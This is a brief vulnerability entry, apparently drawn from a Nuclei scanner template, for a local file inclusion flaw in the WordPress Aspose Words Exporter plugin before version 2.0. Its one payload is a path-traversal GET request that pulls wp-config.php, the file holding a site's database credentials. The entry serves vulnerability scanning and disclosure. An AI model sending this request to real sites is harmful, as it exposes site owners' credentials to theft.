# Vulnerability: WordPress Aspose Words Exporter <2.0 - Local File Inclusion
**Classification:** CWE-23,CWE-73
**Source:** Nuclei Template (`aspose-words-file-download.yaml`)

## Description
WordPress Aspose Words Exporter prior to version 2.0 is vulnerable to local file inclusion.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/wp-content/plugins/aspose-doc-exporter/aspose_doc_exporter_download.php?file=../../../wp-config.php
```

